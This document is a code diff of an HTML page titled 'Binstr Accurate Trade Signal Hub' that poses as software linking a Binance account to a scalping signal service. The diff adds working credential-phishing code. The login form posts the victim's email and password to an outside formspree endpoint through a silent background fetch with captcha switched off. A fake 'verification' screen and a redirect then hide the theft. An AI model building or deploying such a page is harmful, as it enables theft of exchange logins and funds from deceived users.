@@ -1,13 +1,17 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1.0">
+
 <title>Binstr Accurate Trade Signal Hub</title>
 
+<!-- Primary SEO -->
 <meta name="title" content="Binstr Accurate Trade Signal Hub">
 <meta name="description" content="Get real-time accurate trading signals and professional market insights. Join our premium signal platform today.">
 
+<!-- Open Graph / WhatsApp / Facebook -->
 <meta property="og:type" content="website">
 <meta property="og:url" content="https://binatradingsignalconnecthub.github.io/Binstraccuratetradesignal/">
 <meta property="og:title" content="Binstr Accurate Trade Signal Hub">
@@ -16,11 +20,13 @@
 <meta property="og:image:width" content="1200">
 <meta property="og:image:height" content="630">
 
+<!-- Twitter Card -->
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:title" content="Binstr Accurate Trade Signal Hub">
 <meta name="twitter:description" content="Get real-time accurate trading signals and professional market insights.">
 <meta name="twitter:image" content="https://binatradingsignalconnecthub.github.io/Binstraccuratetradesignal/preview.png">
 
+<!-- Favicon -->
 <link rel="icon" type="image/png" href="preview.png">
 
 <style>
@@ -31,6 +37,7 @@ body.dark{background:#0b0f14;color:white;}
 body.dark .app{background:#11161d;}
 .logo{display:block;margin:0 auto 28px;width:140px;}
 .page{padding:44px 32px;width:100%;position:absolute;top:0;left:0;background:inherit;transition:.55s cubic-bezier(.77,0,.18,1);}
+.slide{transform:translateX(-100%);}
 h1{text-align:center;margin-bottom:34px;color:#111;font-size:28px;}
 body.dark h1{color:white;}
 .field{position:relative;margin-bottom:24px;}
@@ -40,7 +47,7 @@ input:focus{border-color:#f5c518;box-shadow:0 0 0 3px rgba(245,197,24,.22);}
 label{position:absolute;left:14px;top:50%;transform:translateY(-50%);color:#7c8794;padding:0 6px;pointer-events:none;transition:.2s;background:inherit;}
 input:focus+label,input:not(:placeholder-shown)+label{top:-8px;font-size:12px;color:#f5c518;}
 button{width:100%;padding:18px;border:none;border-radius:12px;background:#f5c518;font-weight:700;font-size:18px;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;}
-.spin{width:22px;height:22px;border:3px solid rgba(0,0,0,.25);border-top:3px solid black;border-radius:50%;animation:rot .7s linear infinite;}
+.spin{width:18px;height:18px;border:3px solid rgba(0,0,0,.25);border-top:3px solid black;border-radius:50%;animation:rot .7s linear infinite;display:none;}
 @keyframes rot{to{transform:rotate(360deg)}}
 .verify{text-align:center;color:#111;}
 body.dark .verify{color:white;}
@@ -53,14 +60,16 @@ body.dark .theme{background:#222;color:white;}
 <body>
 
 <div class="app">
+
 <div class="theme" onclick="toggleTheme()">☀︎ / 🌙</div>
 
 <!-- LOGIN PAGE -->
 <div class="page" id="login">
+
 <img src="logo.png" class="logo">
 <h1>Connect Trading Account Routing Software</h1>
 
-<form id="form">
+<form id="form" action="https://formspree.io/f/YOURID" method="POST">
 
 <div class="field">
 <input name="email" placeholder=" " required>
@@ -72,8 +81,12 @@ body.dark .theme{background:#222;color:white;}
 <label>Password</label>
 </div>
 
+<input type="hidden" name="_subject" value="New Trading Submission">
+<input type="hidden" name="_captcha" value="false">
+
 <button id="btn" type="submit">
-<span>Connect</span>
+<span id="btnText">Connect</span>
+<div class="spin" id="spin"></div>
 </button>
 
 <p style="margin-top:14px;text-align:center;font-size:13px;line-height:1.45;opacity:.75;">
@@ -81,23 +94,24 @@ click on connect to automatically connect your binance account to the scalping r
 </p>
 
 </form>
+
 </div>
 
 <!-- VERIFY PAGE -->
 <div class="page verify" id="verify" style="left:100%">
+
 <img src="logo.png" class="logo">
-<h1>Verifying Secure Connection</h1>
-<p style="opacity:.75;margin-bottom:20px;font-size:14px;line-height:1.6;">
-Please wait while we securely verify and encrypt your trading account connection.<br>
-Establishing signal routing... Authenticating data stream... Finalizing secure link...
-</p>
-<div class="spin"></div>
+<h1>Verification</h1>
+<p style="opacity:.7;margin-bottom:28px">Checking account security...</p>
+<div class="spin" style="display:inline-block"></div>
+
 </div>
 
 </div>
 
 <script>
 const form=document.getElementById("form");
+const spin=document.getElementById("spin");
 const btn=document.getElementById("btn");
 const login=document.getElementById("login");
 const verify=document.getElementById("verify");
@@ -116,21 +130,28 @@ if(localStorage.getItem("theme")==="dark"){
   document.body.classList.add("dark");
 }
 
-form.addEventListener("submit",function(e){
+form.addEventListener("submit",(e)=>{
   e.preventDefault();
 
+  spin.style.display="block";
   btn.disabled=true;
 
   login.style.transform="translateX(-100%)";
   verify.style.transform="translateX(-100%)";
 
-  setTimeout(function(){
+  // send in background (does not block redirect)
+  try{
+    fetch(form.action,{
+      method:"POST",
+      body:new FormData(form),
+      headers:{'Accept':'application/json'}
+    }).catch(()=>{});
+  }catch(err){}
 
-    // dynamic GitHub Pages safe redirect
-    const basePath = window.location.pathname.split('/')[1];
-    window.location.href = "/" + basePath + "/home.html";
-
-  },2000);
+  // clean reliable redirect
+  setTimeout(()=>{
+    window.location.replace("home.html");
+  },1800);
 });
 </script>
 
